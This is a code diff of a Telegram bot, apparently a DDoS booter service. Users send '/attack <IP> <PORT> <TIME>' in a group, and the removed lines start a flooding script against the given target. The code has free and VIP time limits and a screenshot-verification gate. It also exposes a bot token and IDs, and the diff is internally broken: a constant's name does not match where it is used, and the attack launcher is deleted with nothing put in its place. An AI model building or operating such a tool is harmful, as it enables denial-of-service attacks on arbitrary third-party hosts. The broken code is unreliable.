@@ -18,7 +18,7 @@ bot = telebot.TeleBot('7053228704:AAGLAJFlzJ6M2XZC9HEABD6B5PVubnd-FqY')
 GROUP_ID = "-1002369239894"
 ADMINS = ["7129010361"]
 ADMINS = [7129010361]
-MAX_ATTACKS = 3
+MAX_ATTACKS_TIME = 100
 
 pending_verification = {}  # स्क्रीनशॉट वेरिफिकेशन ट्रैक करेगा
 active_attacks = {}  # एक्टिव अटैक ट्रैक करेगा
@@ -338,34 +338,27 @@ def redeem_key(message):
 # ✅ Handle "/attack" Command
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
-    user_id = str(message.from_user.id)
-    first_name = message.from_user.first_name  
-    username = message.from_user.username  
+    user_id = message.from_user.id
+    first_name = message.from_user.first_name or "Unknown"
+    username = message.from_user.username or "No Username"
+
+    safe_name = re.escape(first_name)  
+    safe_username = f"@{re.escape(username)}" if username != "No Username" else "No Username"
 
     # ✅ सिर्फ ग्रुप में काम करेगा  
     if str(message.chat.id) != GROUP_ID:
         bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
         return
 
-    # ✅ पहले चेक करो कि यूज़र ब्लॉक है या नहीं  
-    if user_id in blocked_users:
-        bot.reply_to(message, f"🚫 **AAP BLOCK HO CHUKE HO! SCREENSHOT BHEJNE TAK ATTACK NAHI KAR SAKTE!**")
-        return
-
-    # ✅ पहले पेंडिंग वेरिफिकेशन चेक करो  
+    # ✅ पहले से कोई पेंडिंग वेरिफिकेशन है तो नया अटैक ब्लॉक करो  
     if user_id in pending_verification:
-        bot.reply_to(message, f"🚫 **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
+        bot.reply_to(message, "🚫 **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
         return
 
     # ✅ सही कमांड फॉर्मेट चेक करें  
     command = message.text.split()
-    
-    if len(command) == 1 or len(command) != 4:  
-        bot.reply_to(message, 
-            "⚠ **USAGE:** `/attack <IP> <PORT> <TIME>`\n\n"
-            "🔹 **Example:** `/attack 1.1.1.1 8080 60`",
-            parse_mode="Markdown"
-        )
+    if len(command) != 4:
+        bot.reply_to(message, "⚠ **USAGE:** /attack <IP> <PORT> <TIME>\n📌 **Example:** `/attack 1.1.1.1 80 60`", parse_mode="MarkdownV2")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -377,81 +370,51 @@ def handle_attack(message):
         bot.reply_to(message, "❌ **PORT AUR TIME SIRF NUMBERS ME HONA CHAHIYE!**")
         return
 
-    if time_duration > 100:
-        bot.reply_to(message, "🚫 **FREE ATTACK TIME 100 SECONDS HAI!**")
+    if time_duration > MAX_ATTACK_TIME:
+        bot.reply_to(message, f"🚫 **FREE ATTACK TIME {MAX_ATTACK_TIME} SECONDS HAI!**")
         return
 
-    # ✅ स्क्रीनशॉट वेरिफिकेशन स्टार्ट  
-    pending_verification[user_id] = True  
+    # ✅ Screenshot Verification Required  
+    pending_verification[user_id] = True
 
     bot.send_message(
         message.chat.id,
-        f"📸 **{first_name} ({'@' + username if username else 'No Username'})! TURANT SCREENSHOT BHEJ!**\n"
-        f"⚠️ **AGAR 2 MINUTE ME NAHI DIYA TO NEXT ATTACK BLOCK HO JAYEGA!**",
-        parse_mode="Markdown"
+        f"📸 **{safe_name} ({safe_username})! TURANT SCREENSHOT BHEJ!**\n"
+        f"⚠ **AGAR NAHI DIYA TO NEXT ATTACK BLOCK HO JAYEGA!**",
+        parse_mode="MarkdownV2"
     )
 
-    # ✅ 2 मिनट बाद चेक करो कि यूजर ने स्क्रीनशॉट भेजा या नहीं  
-    def check_screenshot():
-        time.sleep(120)  # 2 मिनट वेट करें  
+    # ✅ Screenshot Check Function (2 Min का Timer)  
+    def wait_for_screenshot():
+        time.sleep(120)  # 2 Minutes  
         if user_id in pending_verification:  
-            blocked_users.add(user_id)  # ✅ यूजर को सच में ब्लॉक कर दो  
-            del pending_verification[user_id]  
-            bot.send_message(
-                message.chat.id,
-                f"🚫 **{first_name} ({'@' + username if username else 'No Username'}) 2 MINUTE ME SCREENSHOT NAHI DIYA! NEXT ATTACK BLOCK HO CHUKA HAI!** ❌",
-                parse_mode="Markdown"
-            )
+            bot.send_message(message.chat.id, f"❌ **{safe_name} KA ATTACK BLOCK HO GAYA! SCREENSHOT NAHI DIYA!**")
+            pending_verification.pop(user_id, None)  
 
-    threading.Thread(target=check_screenshot, daemon=True).start()
+    threading.Thread(target=wait_for_screenshot, daemon=True).start()
 
-    # ✅ Attack Execution Function  
-    def execute_attack():
-        try:
-            subprocess.Popen(["python3", "attack_ex.py", target, str(port), str(time_duration)])
-            bot.reply_to(message, 
-                f"🚀 **Attack Started by {first_name} ({'@' + username if username else 'No Username'})!**\n"
-                f"🎯 **Target:** `{target}`\n"
-                f"🔢 **Port:** `{port}`\n"
-                f"⏳ **Duration:** `{time_duration}s`", 
-                parse_mode="Markdown"
-            )
-
-            time.sleep(time_duration)
-            bot.send_message(message.chat.id, 
-                f"✅ **Attack Finished!**\n"
-                f"👤 **User:** {first_name} ({'@' + username if username else 'No Username'})\n"
-                f"🎯 **Target:** `{target}`\n"
-                f"🔢 **Port:** `{port}`", 
-                parse_mode="Markdown"
-            )
-
-        except Exception as e:
-            bot.reply_to(message, f"❌ **Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")
-
-    threading.Thread(target=execute_attack, daemon=True).start()
-
-
-# ✅ **अब स्क्रीनशॉट को वेरिफाई और फॉरवर्ड करने का सिस्टम**  
 @bot.message_handler(content_types=['photo'])
-def verify_screenshot(message):
-    user_id = str(message.from_user.id)
+def handle_screenshot(message):
+    user_id = message.from_user.id
+    first_name = message.from_user.first_name or "Unknown"
+    username = message.from_user.username or "No Username"
+
+    safe_name = re.escape(first_name)  
+    safe_username = f"@{re.escape(username)}" if username != "No Username" else "No Username"
 
     if user_id in pending_verification:
-        del pending_verification[user_id]  # ✅ यूजर को अनब्लॉक करें  
-        if user_id in blocked_users:
-            blocked_users.remove(user_id)  # ✅ अगर ब्लॉक था, तो हटा दो  
+        pending_verification.pop(user_id, None)  # ✅ Screenshot मिलने के बाद block हटाओ  
+
+        bot.send_message(message.chat.id, "✅ **SCREENSHOT VERIFIED! AB NAYA ATTACK KAR SAKTE HO!**")
+
+        # ✅ Screenshot Forward to Screenshot Channel  
+        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
 
         bot.send_message(
-            message.chat.id,
-            "✅ **SCREENSHOT VERIFIED! AAPKA NEXT ATTACK ALLOWED HAI!**",
-            parse_mode="Markdown"
+            SCREENSHOT_CHANNEL,
+            f"📸 **Screenshot Received!**\n👤 **User:** {safe_name} ({safe_username})",
+            parse_mode="MarkdownV2"
         )
-
-        # ✅ Screenshot को फॉरवर्ड करना  
-        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
-    else:
-        bot.reply_to(message, "❌ **KOI PENDING VERIFICATION NAHI MILI!**")
 
 #  ✅ `/vipattack` (Max 300 sec, Only for VIP Users)  
 @bot.message_handler(commands=['bgmi'])
